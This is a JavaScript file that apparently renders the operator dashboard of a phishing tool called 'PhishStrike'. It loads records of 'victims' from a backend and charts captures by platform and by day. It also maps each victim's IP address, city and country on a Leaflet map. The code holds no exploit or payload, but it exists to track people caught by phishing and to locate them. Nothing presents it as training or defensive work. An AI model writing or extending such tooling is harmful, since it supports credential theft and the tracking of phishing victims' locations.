// charts.js – Plotly & Leaflet visualizations for PhishStrike dashboard

async function fetchVictimData() {
  const resp = await fetch('/api/victims');
  if (!resp.ok) throw new Error('Failed to load victims');
  return resp.json();
}

async function renderPlatformChart() {
  const data = await fetchVictimData();
  const counts = {};
  data.forEach(v => {
    const p = v.platform || 'Unknown';
    counts[p] = (counts[p] || 0) + 1;
  });
  const labels = Object.keys(counts);
  const values = Object.values(counts);
  const trace = {
    labels, values, type: 'pie', hole: 0.4,
    marker: { colors: ['#00ffff', '#9d00ff', '#ff2d86', '#10b981', '#f59e0b', '#3b82f6', '#8b5cf6', '#ec4899', '#14b8a6', '#f97316'] }
  };
  Plotly.newPlot('platformChart', [trace], {
    title: { text: 'Platform Distribution', font: { color: '#e2e8f0', size: 16 } },
    height: 350, paper_bgcolor: 'rgba(0,0,0,0)', plot_bgcolor: 'rgba(0,0,0,0)',
    font: { color: '#94a3b8' },
    legend: { font: { color: '#e2e8f0' } }
  });
}

async function renderTimelineChart() {
  const data = await fetchVictimData();
  const perDay = {};
  data.forEach(v => {
    const d = (v.timestamp || '').slice(0, 10);
    if (d) perDay[d] = (perDay[d] || 0) + 1;
  });
  const dates = Object.keys(perDay).sort();
  const counts = dates.map(d => perDay[d]);
  const trace = {
    x: dates, y: counts, type: 'scatter', mode: 'lines+markers',
    line: { color: '#00ffff', width: 2 },
    marker: { color: '#9d00ff', size: 6 }
  };
  Plotly.newPlot('timelineChart', [trace], {
    title: { text: 'Captures Over Time', font: { color: '#e2e8f0', size: 16 } },
    xaxis: { title: 'Date', color: '#94a3b8', gridcolor: 'rgba(255,255,255,0.05)' },
    yaxis: { title: 'Count', color: '#94a3b8', gridcolor: 'rgba(255,255,255,0.05)' },
    height: 350, paper_bgcolor: 'rgba(0,0,0,0)', plot_bgcolor: 'rgba(0,0,0,0)',
    font: { color: '#94a3b8' }
  });
}

async function renderGeoMap() {
  const map = L.map('geoMap').setView([20, 0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; OpenStreetMap contributors',
    maxZoom: 18
  }).addTo(map);

  try {
    const resp = await fetch('/api/victim_geo');
    if (!resp.ok) return;
    const points = await resp.json();
    points.forEach(p => {
      const marker = L.marker([p.lat, p.lng]).addTo(map);
      marker.bindPopup(
        `<b>Victim #${p.id}</b><br/>
         Platform: ${p.platform}<br/>
         IP: ${p.ip}<br/>
         ${p.city ? p.city + ', ' : ''}${p.country ? p.country : ''}`
      );
    });
    if (points.length > 0) {
      const group = L.featureGroup(points.map(p => L.marker([p.lat, p.lng])));
      map.fitBounds(group.getBounds().pad(0.1));
    }
  } catch (e) {
    console.error('Geo map error:', e);
  }
}

document.addEventListener('DOMContentLoaded', () => {
  renderPlatformChart().catch(console.error);
  renderTimelineChart().catch(console.error);
  renderGeoMap().catch(console.error);
});
